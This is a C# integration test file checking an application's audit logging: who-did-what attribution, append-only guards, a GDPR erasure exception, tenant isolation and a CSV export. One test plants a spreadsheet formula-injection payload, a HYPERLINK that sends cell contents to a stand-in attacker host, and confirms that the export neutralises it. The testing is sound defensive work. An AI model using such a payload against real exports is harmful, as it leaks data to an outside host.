using System.Net;
using System.Net.Http.Headers;
using System.Net.Http.Json;
using System.Text;
using System.Text.Json;
using ClimateProject.Api.Endpoints;
using ClimateProject.Application.Auditing;
using ClimateProject.Application.Auth;
using ClimateProject.Application.OrgStructure;
using ClimateProject.Application.Profile;
using ClimateProject.Application.Surveys;
using ClimateProject.Domain.Entities;
using ClimateProject.Infrastructure.Persistence;
using ClimateProject.IntegrationTests.Support;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.DependencyInjection;

namespace ClimateProject.IntegrationTests.Auditing;

/// <summary>
/// The behavioural half of #143. <c>AuditCoverageTests</c> proves the policy says every
/// mutating route is audited; this proves a request that goes through the real pipeline comes
/// out the other side with a row in <c>audit_logs</c> that says who, what and to which row.
///
/// ## Isolation
///
/// Every test signs up its own user, and every assertion filters on that user's id. The suite
/// shares one Postgres and one company per class, so a filter on the company would see rows
/// left by the test before it.
/// </summary>
[Collection("Postgres")]
public class AuditLoggingTests : IAsyncLifetime
{
    private readonly PostgresContainerFixture _postgres;

    // Its own email domain and its own company row: the suite shares one Postgres and
    // `companies.email_domain` carries a filtered unique index.
    private readonly string _companyDomain = $"audit-{Guid.NewGuid():N}.test";

    private Guid _companyId;

    public AuditLoggingTests(PostgresContainerFixture postgres) => _postgres = postgres;

    private AuthWebApplicationFactory Factory => _postgres.App;

    /// <summary>
    /// A context built straight from the connection string, with none of the application's
    /// interceptors on it. Used for reading rows back and for seeding.
    /// <see cref="Audit_rows_cannot_be_updated"/> deliberately uses the application's own
    /// context instead, because the guard under test is registered there.
    /// </summary>
    private ClimateProjectDbContext CreateContext() => new(
        new DbContextOptionsBuilder<ClimateProjectDbContext>().UseNpgsql(_postgres.ConnectionString).Options);

    public async Task InitializeAsync()
    {
        await using var db = CreateContext();
        await db.Database.MigrateAsync();

        var company = new Company
        {
            Id = Guid.NewGuid(),
            Name = "Audit Co",
            EmailDomain = _companyDomain,
            CreatedAt = DateTimeOffset.UtcNow,
        };
        db.Companies.Add(company);
        _companyId = company.Id;

        await db.SaveChangesAsync();
    }

    // Nothing to dispose: the host belongs to the collection fixture (#279).
    public Task DisposeAsync() => Task.CompletedTask;

    private const string SignupPassword = "Sign4upPassword";

    private async Task<(HttpClient Client, Guid UserId)> SignUpAsync(string role)
    {
        var client = Factory.CreateClient();
        var email = $"{Guid.NewGuid():N}@{_companyDomain}";

        var signup = await client.PostAsJsonAsync("/auth/signup", new SignupRequest("Audit Person", email, SignupPassword));
        Assert.Equal(HttpStatusCode.Created, signup.StatusCode);

        Guid userId;
        await using (var db = CreateContext())
        {
            var user = await db.Users.FirstAsync(u => u.Email == email);
            user.Role = role;
            await db.SaveChangesAsync();
            userId = user.Id;
        }

        // Logged in after the role change so the token carries the new role.
        var login = await client.PostAsJsonAsync("/auth/login", new LoginRequest(email, SignupPassword));
        Assert.Equal(HttpStatusCode.OK, login.StatusCode);
        var token = (await login.Content.ReadFromJsonAsync<TokenResponse>())!.Token;
        client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", token);

        return (client, userId);
    }

    private async Task<List<AuditLog>> RowsForAsync(Guid userId)
    {
        await using var db = CreateContext();
        return await db.AuditLogs
            .AsNoTracking()
            .Where(a => a.UserId == userId)
            .OrderBy(a => a.Timestamp)
            .ThenBy(a => a.Id)
            .ToListAsync();
    }

    // ------------------------------------------------------------------ writing

    /// <summary>
    /// The central claim: a create and an update, over the real pipeline, leave one row each,
    /// naming the actor, the tenant, the derived action and the row acted on.
    /// </summary>
    [Fact]
    public async Task A_create_and_an_update_each_write_one_attributed_row()
    {
        var (client, userId) = await SignUpAsync(Roles.CompanyAdmin);

        var create = await client.PostAsJsonAsync(
            "/admin/departments",
            new CreateDepartmentRequest(_companyId, $"Audited {Guid.NewGuid():N}", null, null, true));
        Assert.Equal(HttpStatusCode.Created, create.StatusCode);
        var departmentId = (await create.Content.ReadFromJsonAsync<DepartmentDetail>())!.Id;

        var update = await client.PutAsJsonAsync(
            $"/admin/departments/{departmentId}",
            new UpdateDepartmentRequest("Renamed", null, null));
        Assert.Equal(HttpStatusCode.OK, update.StatusCode);

        var rows = await RowsForAsync(userId);

        Assert.Equal(2, rows.Count);
        Assert.All(rows, row =>
        {
            Assert.Equal(_companyId, row.CompanyId);
            Assert.Equal("admin.departments", row.Resource);
            Assert.Equal(departmentId.ToString(), row.ResourceId);
            Assert.True(row.Success);
            Assert.Null(row.ErrorMessage);
        });

        Assert.Equal("admin.departments.create", rows[0].Action);
        Assert.Equal("admin.departments.update", rows[1].Action);

        // details is the jsonb that says which request it was. Never the body -- see
        // AuditWritingMiddleware.Describe. Parsed rather than substring-matched: the column is
        // jsonb, so Postgres hands back its own normalised spelling of the object, not the
        // bytes that were sent.
        AssertDetails(rows[0].Details, "POST", "/admin/departments", 201);
        AssertDetails(rows[1].Details, "PUT", $"/admin/departments/{departmentId}", 200);
    }

    private static void AssertDetails(string? details, string method, string path, int status)
    {
        var root = JsonDocument.Parse(Assert.IsType<string>(details)).RootElement;

        Assert.Equal(method, root.GetProperty("Method").GetString());
        Assert.Equal(path, root.GetProperty("Path").GetString());
        Assert.Equal(status, root.GetProperty("Status").GetInt32());
    }

    /// <summary>
    /// A refused mutation is recorded as an attempt. This is the half an EF
    /// <c>SaveChanges</c> interceptor could not have covered: the handler returns 403 without
    /// ever calling <c>SaveChangesAsync</c>, so there is no change for an interceptor to see.
    /// </summary>
    [Fact]
    public async Task A_refused_mutation_is_recorded_as_a_failed_attempt()
    {
        var (client, userId) = await SignUpAsync(Roles.CompanyAdmin);

        var refused = await client.PostAsJsonAsync(
            "/admin/departments",
            new CreateDepartmentRequest(Guid.NewGuid(), "Another company's department", null, null, true));

        Assert.Equal(HttpStatusCode.Forbidden, refused.StatusCode);

        var row = Assert.Single(await RowsForAsync(userId));

        Assert.Equal("admin.departments.create", row.Action);
        Assert.False(row.Success);
        Assert.Equal("HTTP 403", row.ErrorMessage);

        // Filed under the actor's own company, not the one they asked about -- a caller must
        // not be able to write rows into another tenant's trail by naming it.
        Assert.Equal(_companyId, row.CompanyId);
    }

    /// <summary>
    /// Reads: the marked one is recorded, the unmarked one is not. Both directions matter --
    /// the trail is useless if it misses an export and unreadable if it records every page
    /// view.
    /// </summary>
    [Fact]
    public async Task A_sensitive_read_is_audited_and_an_ordinary_read_is_not()
    {
        var (client, userId) = await SignUpAsync(Roles.CompanyAdmin);

        Assert.Equal(HttpStatusCode.OK, (await client.GetAsync("/audit/logs")).StatusCode);
        Assert.Empty(await RowsForAsync(userId));

        Assert.Equal(HttpStatusCode.OK, (await client.GetAsync("/audit/export")).StatusCode);

        var row = Assert.Single(await RowsForAsync(userId));
        Assert.Equal(AuditEndpoints.ExportAction, row.Action);
        Assert.Equal(AuditEndpoints.ExportResource, row.Resource);
        Assert.True(row.Success);
    }

    /// <summary>
    /// The profile routes kept their own vocabulary when #143 took the writing away from them.
    /// One row, not two: a second writer inside the handler would double every profile
    /// mutation, which is what the issue warned against.
    /// </summary>
    [Fact]
    public async Task A_profile_update_writes_one_row_under_the_profile_vocabulary()
    {
        var (client, userId) = await SignUpAsync(Roles.Employee);

        Assert.Equal(
            HttpStatusCode.OK,
            (await client.PutAsJsonAsync("/profile", new UpdateProfileRequest("Renamed Person"))).StatusCode);

        var row = Assert.Single(await RowsForAsync(userId));

        Assert.Equal(ProfileAuditActions.Update, row.Action);
        Assert.Equal(ProfileAuditActions.Resource, row.Resource);
        Assert.Equal(userId.ToString(), row.ResourceId);
        Assert.True(row.Success);
    }

    /// <summary>A failed password change is recorded as one, under the same vocabulary.</summary>
    [Fact]
    public async Task A_failed_password_change_is_recorded_once_and_as_a_failure()
    {
        var (client, userId) = await SignUpAsync(Roles.Employee);

        var wrong = await client.PutAsJsonAsync(
            "/profile/password",
            new ChangePasswordRequest("not-the-current-password", "Rep1acement!"));

        Assert.Equal(HttpStatusCode.BadRequest, wrong.StatusCode);

        var row = Assert.Single(await RowsForAsync(userId));
        Assert.Equal(ProfileAuditActions.PasswordChange, row.Action);
        Assert.Equal(ProfileAuditActions.Resource, row.Resource);
        Assert.False(row.Success);
    }

    // ------------------------------------------------------------------ append-only

    /// <summary>
    /// Resolved from the application's own service provider, so it carries the interceptor
    /// <c>Program.cs</c> registers. <see cref="CreateContext"/> deliberately does not.
    /// </summary>
    private static ClimateProjectDbContext AppContext(IServiceScope scope)
        => scope.ServiceProvider.GetRequiredService<ClimateProjectDbContext>();

    [Fact]
    public async Task Audit_rows_cannot_be_updated()
    {
        var (client, userId) = await SignUpAsync(Roles.Employee);
        Assert.Equal(
            HttpStatusCode.OK,
            (await client.PutAsJsonAsync("/profile", new UpdateProfileRequest("Before"))).StatusCode);

        using var scope = Factory.Services.CreateScope();
        var db = AppContext(scope);
        var row = await db.AuditLogs.FirstAsync(a => a.UserId == userId);
        row.Action = "tampered";

        var error = await Assert.ThrowsAsync<InvalidOperationException>(() => db.SaveChangesAsync());
        Assert.Contains("append-only", error.Message, StringComparison.Ordinal);

        // And the row is still what it was.
        var rows = await RowsForAsync(userId);
        Assert.Equal(ProfileAuditActions.Update, Assert.Single(rows).Action);
    }

    /// <summary>
    /// The GDPR erasure exception is exactly one shape, and these pin every edge of it.
    /// </summary>
    /// <remarks>
    /// #144 needed to delete a subject's <c>survey_audit_logs</c> rows, which this guard
    /// otherwise refuses, so <c>AllowSubjectErasureDeletes</c> opens a hole. A hole in an
    /// append-only guard is only as safe as its edges are tested — without these, widening the
    /// scope to cover <c>audit_logs</c>, or to permit UPDATE, breaks nothing and no reviewer
    /// would necessarily notice. Each of these fails if the scope grows in that direction.
    /// </remarks>
    /// <summary>
    /// Seeds one <c>survey_audit_logs</c> row and returns its id.
    /// </summary>
    /// <remarks>
    /// The erasure exception applies to THIS table and no other, so a test of its edges has to
    /// act on this table. Two of these tests originally acted on <c>audit_logs</c>, which is
    /// never exempt whatever the scope says — so they threw either way and could not fail when
    /// the hole was widened. Seeding a real row is what makes them falsifiable.
    /// </remarks>
    private async Task<Guid> SeedSurveyAuditRowAsync(Guid userId)
    {
        using var scope = Factory.Services.CreateScope();
        var db = AppContext(scope);
        var now = DateTimeOffset.UtcNow;

        var survey = new Survey
        {
            Id = Guid.NewGuid(),
            CompanyId = _companyId,
            CreatedBy = userId,
            TitleEn = "Climate",
            TitleEs = "Clima",
            DescriptionEn = "d",
            DescriptionEs = "d",
            Type = "general_climate",
            Status = "active",
            StartDate = now,
            EndDate = now.AddDays(30),
            CreatedAt = now,
            UpdatedAt = now,
        };
        db.Surveys.Add(survey);

        var row = new SurveyAuditLog
        {
            Id = Guid.NewGuid(),
            SurveyId = survey.Id,
            Action = "updated",
            EntityType = "survey",
            UserId = userId,
            UserName = "Someone",
            UserEmail = "someone@example.test",
            UserRole = Roles.CompanyAdmin,
            Timestamp = now,
        };
        db.SurveyAuditLogs.Add(row);
        await db.SaveChangesAsync();
        return row.Id;
    }

    [Fact]
    public async Task The_erasure_scope_does_not_reach_audit_logs()
    {
        var (client, userId) = await SignUpAsync(Roles.Employee);
        Assert.Equal(
            HttpStatusCode.OK,
            (await client.PutAsJsonAsync("/profile", new UpdateProfileRequest("Before"))).StatusCode);

        using var scope = Factory.Services.CreateScope();
        var db = AppContext(scope);
        db.AuditLogs.RemoveRange(await db.AuditLogs.Where(a => a.UserId == userId).ToListAsync());

        using (AuditLogAppendOnlyInterceptor.AllowSubjectErasureDeletes())
        {
            var error = await Assert.ThrowsAsync<InvalidOperationException>(() => db.SaveChangesAsync());
            Assert.Contains("audit_logs", error.Message, StringComparison.Ordinal);
        }
    }

    [Fact]
    public async Task The_erasure_scope_permits_deletes_but_never_updates()
    {
        var (_, userId) = await SignUpAsync(Roles.CompanyAdmin);
        var rowId = await SeedSurveyAuditRowAsync(userId);

        using var scope = Factory.Services.CreateScope();
        var db = AppContext(scope);
        var row = await db.SurveyAuditLogs.SingleAsync(a => a.Id == rowId);
        row.Action = "tampered";

        using (AuditLogAppendOnlyInterceptor.AllowSubjectErasureDeletes())
        {
            var error = await Assert.ThrowsAsync<InvalidOperationException>(() => db.SaveChangesAsync());
            Assert.Contains("append-only", error.Message, StringComparison.Ordinal);
        }
    }

    [Fact]
    public async Task The_erasure_scope_does_permit_the_delete_it_exists_for()
    {
        // The positive control. Without it, the three refusals above would all still pass if the
        // scope did nothing at all, and #144's erasure would be the only thing that noticed.
        var (_, userId) = await SignUpAsync(Roles.CompanyAdmin);
        var rowId = await SeedSurveyAuditRowAsync(userId);

        using var scope = Factory.Services.CreateScope();
        var db = AppContext(scope);
        db.SurveyAuditLogs.Remove(await db.SurveyAuditLogs.SingleAsync(a => a.Id == rowId));

        using (AuditLogAppendOnlyInterceptor.AllowSubjectErasureDeletes())
        {
            await db.SaveChangesAsync();
        }

        Assert.False(await db.SurveyAuditLogs.AnyAsync(a => a.Id == rowId));
    }

    [Fact]
    public async Task The_erasure_scope_closes_when_it_is_disposed()
    {
        var (_, userId) = await SignUpAsync(Roles.CompanyAdmin);

        using (AuditLogAppendOnlyInterceptor.AllowSubjectErasureDeletes())
        {
            // deliberately empty: the scope opens and closes with nothing inside it
        }

        // A survey_audit_logs delete attempted after the scope closed is refused exactly as
        // before, so the flag does not leak past its using block and leave the guard open. This
        // has to act on survey_audit_logs: audit_logs is never exempt, so deleting one would
        // throw whether the flag leaked or not.
        var rowId = await SeedSurveyAuditRowAsync(userId);
        using var scope = Factory.Services.CreateScope();
        var db = AppContext(scope);
        db.SurveyAuditLogs.Remove(await db.SurveyAuditLogs.SingleAsync(a => a.Id == rowId));

        var error = await Assert.ThrowsAsync<InvalidOperationException>(() => db.SaveChangesAsync());
        Assert.Contains("append-only", error.Message, StringComparison.Ordinal);
    }

    [Fact]
    public async Task Audit_rows_cannot_be_deleted()
    {
        var (client, userId) = await SignUpAsync(Roles.Employee);
        Assert.Equal(
            HttpStatusCode.OK,
            (await client.PutAsJsonAsync("/profile", new UpdateProfileRequest("Before"))).StatusCode);

        using var scope = Factory.Services.CreateScope();
        var db = AppContext(scope);
        db.AuditLogs.Remove(await db.AuditLogs.FirstAsync(a => a.UserId == userId));

        await Assert.ThrowsAsync<InvalidOperationException>(() => db.SaveChangesAsync());
        Assert.Single(await RowsForAsync(userId));
    }

    [Fact]
    public async Task Survey_audit_rows_cannot_be_deleted_either()
    {
        var (surveyId, actorId) = await SeedSurveyTrailAsync();

        using var scope = Factory.Services.CreateScope();
        var db = AppContext(scope);
        db.SurveyAuditLogs.Remove(await db.SurveyAuditLogs.FirstAsync(a => a.SurveyId == surveyId));

        var error = await Assert.ThrowsAsync<InvalidOperationException>(() => db.SaveChangesAsync());
        Assert.Contains("survey_audit_logs", error.Message, StringComparison.Ordinal);

        Assert.NotEqual(Guid.Empty, actorId);
    }

    // ------------------------------------------------------------------ reading

    [Fact]
    public async Task An_employee_cannot_read_the_trail()
    {
        var (client, _) = await SignUpAsync(Roles.Employee);

        Assert.Equal(HttpStatusCode.Forbidden, (await client.GetAsync("/audit/logs")).StatusCode);
        Assert.Equal(HttpStatusCode.Forbidden, (await client.GetAsync("/audit/export")).StatusCode);
        Assert.Equal(HttpStatusCode.Forbidden, (await client.GetAsync("/audit/report")).StatusCode);
    }

    /// <summary>
    /// A CompanyAdmin sees their own tenant and cannot widen it by asking. The
    /// <c>companyId</c> parameter is honoured only for SuperAdmin.
    /// </summary>
    [Fact]
    public async Task A_company_admin_cannot_read_another_tenants_rows()
    {
        var (client, userId) = await SignUpAsync(Roles.CompanyAdmin);

        var (otherCompanyId, otherRowId) = await SeedForeignAuditRowAsync();

        // A row of our own to prove the endpoint is returning anything at all.
        Assert.Equal(
            HttpStatusCode.Created,
            (await client.PostAsJsonAsync(
                "/admin/departments",
                new CreateDepartmentRequest(_companyId, $"Visible {Guid.NewGuid():N}", null, null, true))).StatusCode);

        var page = await ReadPageAsync(client, $"/audit/logs?companyId={otherCompanyId}");

        Assert.Contains(page.Items, i => i.UserId == userId);
        Assert.DoesNotContain(page.Items, i => i.Id == otherRowId);
    }

    /// <summary>
    /// The entity trail returns both tables for a survey, tagged by source. This is what
    /// "reconciled, not two trails" means in practice: one ordered list, not a second endpoint
    /// the reader has to know about.
    /// </summary>
    /// <remarks>
    /// The general half is produced by a real HTTP mutation, not seeded. It has to be: the
    /// row a mutation writes is filed under the route that made it — <c>surveys.status</c>,
    /// not <c>surveys</c> — so seeding the survey and asserting only that the
    /// <c>survey_audit_logs</c> row comes back proves nothing about the merge and passed
    /// while <c>GET /audit/surveys/{id}</c> returned no general rows at all. That is the
    /// question #143 opens with ("who changed this survey after responses arrived"), so it is
    /// asserted here from both directions: the sub-resource row is present, and its resource
    /// is the sub-resource name rather than the one that was asked for.
    /// </remarks>
    [Fact]
    public async Task The_entity_trail_merges_the_general_and_survey_records()
    {
        var (client, userId) = await SignUpAsync(Roles.CompanyAdmin);
        var (surveyId, _) = await SeedSurveyTrailAsync();

        // A real mutation against the survey: active -> closed is a legal transition, and it
        // writes both an audit_logs row (resource surveys.status) and a survey_audit_logs one.
        var closed = await client.PutAsJsonAsync(
            $"/surveys/{surveyId}/status",
            new UpdateSurveyStatusRequest(SurveyStatuses.Closed));
        Assert.Equal(HttpStatusCode.OK, closed.StatusCode);

        var response = await client.GetAsync($"/audit/surveys/{surveyId}");
        Assert.Equal(HttpStatusCode.OK, response.StatusCode);

        var items = (await response.Content.ReadFromJsonAsync<List<AuditLogItem>>())!;

        var generalRow = Assert.Single(items, i => i.Source == AuditSources.General);
        Assert.Equal("surveys.status.update", generalRow.Action);
        Assert.Equal("surveys.status", generalRow.Resource);
        Assert.Equal(surveyId.ToString(), generalRow.ResourceId);
        Assert.Equal(userId, generalRow.UserId);

        // Both survey-side rows: the seeded one and the one the status change wrote. The
        // status_changed row files its own entity type ("status") and no entity id, which is
        // SurveyAuditTrail's shape and not this endpoint's to change.
        Assert.Contains(
            items,
            i => i.Source == AuditSources.Survey && i.Action == "published" && i.ResourceId == surveyId.ToString());
        Assert.Contains(items, i => i.Source == AuditSources.Survey && i.Action == "status_changed");
    }

    /// <summary>
    /// Asking for a sub-resource by its own name still narrows to that route's rows. The
    /// prefix match widens what <c>surveys</c> answers; it must not stop <c>surveys.status</c>
    /// meaning what it says.
    /// </summary>
    [Fact]
    public async Task The_entity_trail_can_still_be_narrowed_to_one_sub_resource()
    {
        var (client, _) = await SignUpAsync(Roles.CompanyAdmin);
        var (surveyId, _) = await SeedSurveyTrailAsync();

        // Two different routes against the same survey, so "everything" and "just this route"
        // have different answers and the filter has something to get wrong.
        Assert.Equal(
            HttpStatusCode.Created,
            (await client.PostAsync($"/surveys/{surveyId}/duplicate", content: null)).StatusCode);

        Assert.Equal(
            HttpStatusCode.OK,
            (await client.PutAsJsonAsync(
                $"/surveys/{surveyId}/status",
                new UpdateSurveyStatusRequest(SurveyStatuses.Closed))).StatusCode);

        var whole = await ReadTrailAsync(client, $"/audit/surveys/{surveyId}");
        var general = whole.Where(i => i.Source == AuditSources.General).ToList();

        Assert.Equal(2, general.Count);
        Assert.Contains(general, i => i.Resource == "surveys.status");
        Assert.Contains(general, i => i.Resource == "surveys.duplicate");

        var narrowed = await ReadTrailAsync(client, $"/audit/surveys.status/{surveyId}");

        Assert.Equal("surveys.status", Assert.Single(narrowed).Resource);
    }

    private static async Task<List<AuditLogItem>> ReadTrailAsync(HttpClient client, string url)
    {
        var response = await client.GetAsync(url);
        Assert.Equal(HttpStatusCode.OK, response.StatusCode);
        return (await response.Content.ReadFromJsonAsync<List<AuditLogItem>>())!;
    }

    /// <summary>
    /// The export cannot be turned into a spreadsheet formula by the people it names.
    /// </summary>
    /// <remarks>
    /// The attack is entirely inside the product's own rules: an ordinary Employee sets their
    /// display name through <c>PUT /profile</c>, which accepts any non-blank string, and the
    /// only people who can open <c>GET /audit/export</c> are CompanyAdmins and SuperAdmins. So
    /// a formula in a name runs with the reader's authority on the reader's machine. Quoting
    /// the field does not prevent it — Excel and LibreOffice evaluate a quoted cell that
    /// begins with <c>=</c> — which is why this asserts on the neutralising apostrophe and not
    /// merely on the quotes.
    /// </remarks>
    [Fact]
    public async Task An_employees_display_name_cannot_smuggle_a_formula_into_the_export()
    {
        var (employee, employeeId) = await SignUpAsync(Roles.Employee);
        const string Payload = "=HYPERLINK(\"http://attacker.test/?\"&A1,\"click me\")";

        Assert.Equal(
            HttpStatusCode.OK,
            (await employee.PutAsJsonAsync("/profile", new UpdateProfileRequest(Payload))).StatusCode);

        var (admin, _) = await SignUpAsync(Roles.CompanyAdmin);
        var export = await admin.GetAsync($"/audit/export?userId={employeeId}");
        Assert.Equal(HttpStatusCode.OK, export.StatusCode);

        var csv = await export.Content.ReadAsStringAsync();

        // The name is there -- neutralising must not mean dropping the evidence.
        Assert.Contains("attacker.test", csv, StringComparison.Ordinal);

        // ...and it is inert: the cell starts with an apostrophe, so no spreadsheet reads it
        // as a formula. Quoting alone would leave "=HYPERLINK( in the file.
        Assert.Contains("\"'=HYPERLINK(", csv, StringComparison.Ordinal);
        Assert.DoesNotContain("\"=HYPERLINK(", csv, StringComparison.Ordinal);
    }

    /// <summary>
    /// The tenant on the row comes from the actor's own <c>users</c> row, not from the
    /// <c>companyId</c> claim in the token they presented.
    /// </summary>
    /// <remarks>
    /// The two can disagree: a token is valid for 24h and a user can be moved between
    /// companies inside that window. Trusting the claim would file the row in the tenant the
    /// user has left — visible to the wrong CompanyAdmin, invisible to the right one — which
    /// is a tenant-isolation failure in a table whose whole job is attribution.
    ///
    /// Driven through <c>PUT /admin/departments/{id}</c> rather than a profile route on
    /// purpose: the profile handlers resolve the actor themselves and hand it to
    /// <c>AuditEntry.AttributeTo</c>, so they would pass this test however the middleware
    /// behaved. This endpoint enriches nothing, so the row is attributed by
    /// <c>AuditWritingMiddleware.ResolveActorAsync</c> — the code under test.
    /// </remarks>
    [Fact]
    public async Task The_row_is_filed_under_the_actors_user_row_not_the_tokens_company_claim()
    {
        var (client, userId) = await SignUpAsync(Roles.CompanyAdmin);

        var create = await client.PostAsJsonAsync(
            "/admin/departments",
            new CreateDepartmentRequest(_companyId, $"Moved {Guid.NewGuid():N}", null, null, true));
        Assert.Equal(HttpStatusCode.Created, create.StatusCode);
        var departmentId = (await create.Content.ReadFromJsonAsync<DepartmentDetail>())!.Id;

        // The user moves companies. The token in `client` still says the old one, and the
        // handler's own authorization check reads that claim, so the request is still allowed.
        var newCompanyId = await MoveUserToANewCompanyAsync(userId);

        Assert.Equal(
            HttpStatusCode.OK,
            (await client.PutAsJsonAsync(
                $"/admin/departments/{departmentId}",
                new UpdateDepartmentRequest("Renamed after the move", null, null))).StatusCode);

        var rows = await RowsForAsync(userId);

        Assert.Equal(_companyId, rows[0].CompanyId);
        Assert.Equal(newCompanyId, rows[1].CompanyId);
        Assert.NotEqual(_companyId, rows[1].CompanyId);
    }

    /// <summary>
    /// A mutating endpoint that accepts an unidentified caller writes no row, and that is a
    /// known, written-down gap rather than a surprise.
    /// </summary>
    /// <remarks>
    /// <c>audit_logs.company_id</c> is NOT NULL behind a RESTRICT foreign key, so a request
    /// with no user row behind it has no tenant to file under; the middleware logs a warning
    /// and abandons the write. This test exists so the gap cannot change size in silence:
    /// <c>AuditCoverageTests.UnattributableMutatingRoutes</c> pins the set of endpoints from
    /// the live route table, and this pins the behaviour behind it. Closing the gap — a
    /// nullable <c>company_id</c>, which is a migration — should make this test fail, and that
    /// failure is the intended signal, not a regression.
    /// </remarks>
    [Fact]
    public async Task An_unidentified_mutation_writes_no_row()
    {
        var (_, userId) = await SignUpAsync(Roles.Employee);

        await using (var db = CreateContext())
        {
            var email = (await db.Users.AsNoTracking().FirstAsync(u => u.Id == userId)).Email;
            var anonymous = Factory.CreateClient();

            for (var attempt = 0; attempt < 3; attempt++)
            {
                var refused = await anonymous.PostAsJsonAsync(
                    "/auth/login",
                    new LoginRequest(email, "not-the-password"));

                Assert.Equal(HttpStatusCode.Unauthorized, refused.StatusCode);
            }
        }

        // Three failed logins against a real account: no row, because there is no identified
        // caller to attribute one to.
        Assert.Empty(await RowsForAsync(userId));
    }

    /// <summary>
    /// A request that ends in an unhandled exception records no status rather than the 200 it
    /// had not yet stopped being.
    /// </summary>
    /// <remarks>
    /// This middleware writes its row from a <c>finally</c>, while the exception is still on
    /// its way out to <c>UseExceptionHandler</c>, which is registered upstream in
    /// <c>Program.cs</c> and has not set a status yet. Recording <c>Response.StatusCode</c>
    /// there produced <c>{"Status":200}</c> next to <c>success=false</c> on a request that the
    /// caller saw as a 500 — the row contradicted itself on exactly the events most worth
    /// reading. Provoked with a malformed body so the failure comes from the framework rather
    /// than from a handler this test would then also be testing.
    /// </remarks>
    [Fact]
    public async Task A_request_that_throws_records_no_status_and_names_the_exception()
    {
        var (client, userId) = await SignUpAsync(Roles.Employee);

        var malformed = new StringContent("{\"name\": ", Encoding.UTF8, "application/json");
        var response = await client.PutAsync("/profile", malformed);

        Assert.True(
            response.StatusCode is HttpStatusCode.InternalServerError or HttpStatusCode.BadRequest,
            $"expected the malformed body to fail the request, got {(int)response.StatusCode}");

        var row = Assert.Single(await RowsForAsync(userId));

        Assert.False(row.Success);
        Assert.Equal("BadHttpRequestException", row.ErrorMessage);

        var status = JsonDocument.Parse(Assert.IsType<string>(row.Details)).RootElement.GetProperty("Status");
        Assert.Equal(JsonValueKind.Null, status.ValueKind);
    }

    /// <summary>
    /// #143 asks for "before/after where meaningful". <c>PUT /admin/departments/{id}</c> is
    /// the worked example; the values reach <c>details</c> through <c>AuditEntry</c>.
    /// </summary>
    [Fact]
    public async Task An_update_records_the_before_and_after_of_the_fields_it_changed()
    {
        var (client, userId) = await SignUpAsync(Roles.CompanyAdmin);

        var originalName = $"Before {Guid.NewGuid():N}";
        var create = await client.PostAsJsonAsync(
            "/admin/departments",
            new CreateDepartmentRequest(_companyId, originalName, null, null, true));
        Assert.Equal(HttpStatusCode.Created, create.StatusCode);
        var departmentId = (await create.Content.ReadFromJsonAsync<DepartmentDetail>())!.Id;

        Assert.Equal(
            HttpStatusCode.OK,
            (await client.PutAsJsonAsync(
                $"/admin/departments/{departmentId}",
                new UpdateDepartmentRequest("After", null, false))).StatusCode);

        var rows = await RowsForAsync(userId);
        var changes = JsonDocument.Parse(Assert.IsType<string>(rows[1].Details))
            .RootElement.GetProperty("Changes");

        Assert.Equal(originalName, changes.GetProperty("name").GetProperty("Before").GetString());
        Assert.Equal("After", changes.GetProperty("name").GetProperty("After").GetString());
        Assert.Equal("True", changes.GetProperty("isActive").GetProperty("Before").GetString());
        Assert.Equal("False", changes.GetProperty("isActive").GetProperty("After").GetString());

        // The create recorded none: there is no "before" for a row that did not exist, and an
        // absent diff is null rather than an empty object.
        var createDetails = JsonDocument.Parse(Assert.IsType<string>(rows[0].Details)).RootElement;
        Assert.Equal(JsonValueKind.Null, createDetails.GetProperty("Changes").ValueKind);
    }

    /// <summary>
    /// <c>GET /profile/activity</c> is still the three self-service events, not everything the
    /// caller has ever done.
    /// </summary>
    /// <remarks>
    /// #143 gave <c>audit_logs</c> one writer for the whole application, which would have
    /// broadened this endpoint by itself. Its UI renders anything it does not have copy for as
    /// the raw dotted action name, identically in English and Spanish, so the broadening would
    /// have shipped untranslated wire values onto the profile page. The filter is the contract
    /// this endpoint had before #143 and the one its screen is written for.
    /// </remarks>
    [Fact]
    public async Task The_activity_list_stays_the_callers_own_profile_events()
    {
        var (client, _) = await SignUpAsync(Roles.CompanyAdmin);

        Assert.Equal(
            HttpStatusCode.OK,
            (await client.PutAsJsonAsync("/profile", new UpdateProfileRequest("Renamed Person"))).StatusCode);

        Assert.Equal(
            HttpStatusCode.Created,
            (await client.PostAsJsonAsync(
                "/admin/departments",
                new CreateDepartmentRequest(_companyId, $"Not activity {Guid.NewGuid():N}", null, null, true))).StatusCode);

        var response = await client.GetAsync("/profile/activity");
        Assert.Equal(HttpStatusCode.OK, response.StatusCode);

        var activity = (await response.Content.ReadFromJsonAsync<ProfileActivityResponse>())!;

        Assert.Equal(ProfileAuditActions.Update, Assert.Single(activity.Activity).Action);
    }

    /// <summary>Moves the user to a brand new company and returns its id.</summary>
    private async Task<Guid> MoveUserToANewCompanyAsync(Guid userId)
    {
        await using var db = CreateContext();

        var company = new Company
        {
            Id = Guid.NewGuid(),
            Name = "Destination Co",
            EmailDomain = $"moved-{Guid.NewGuid():N}.test",
            CreatedAt = DateTimeOffset.UtcNow,
        };
        db.Companies.Add(company);

        var user = await db.Users.FirstAsync(u => u.Id == userId);
        user.CompanyId = company.Id;

        await db.SaveChangesAsync();
        return company.Id;
    }

    private async Task<AuditLogPage> ReadPageAsync(HttpClient client, string url)
    {
        var response = await client.GetAsync(url);
        Assert.Equal(HttpStatusCode.OK, response.StatusCode);
        return (await response.Content.ReadFromJsonAsync<AuditLogPage>())!;
    }

    // ------------------------------------------------------------------ seeding

    /// <summary>An audit row belonging to a company this class's users are not in.</summary>
    private async Task<(Guid CompanyId, Guid RowId)> SeedForeignAuditRowAsync()
    {
        await using var db = CreateContext();

        var company = new Company
        {
            Id = Guid.NewGuid(),
            Name = "Other Co",
            EmailDomain = $"other-{Guid.NewGuid():N}.test",
            CreatedAt = DateTimeOffset.UtcNow,
        };
        db.Companies.Add(company);

        var row = new AuditLog
        {
            Id = Guid.NewGuid(),
            UserId = null,
            CompanyId = company.Id,
            Action = "other.create",
            Resource = "other",
            Success = true,
            Timestamp = DateTimeOffset.UtcNow,
        };
        db.AuditLogs.Add(row);

        await db.SaveChangesAsync();
        return (company.Id, row.Id);
    }

    /// <summary>
    /// A survey in this class's company with one <c>survey_audit_logs</c> row, seeded directly.
    /// Driving <c>POST /surveys</c> plus a publish would exercise <c>SurveyEndpoints</c>, which
    /// these tests are not about.
    /// </summary>
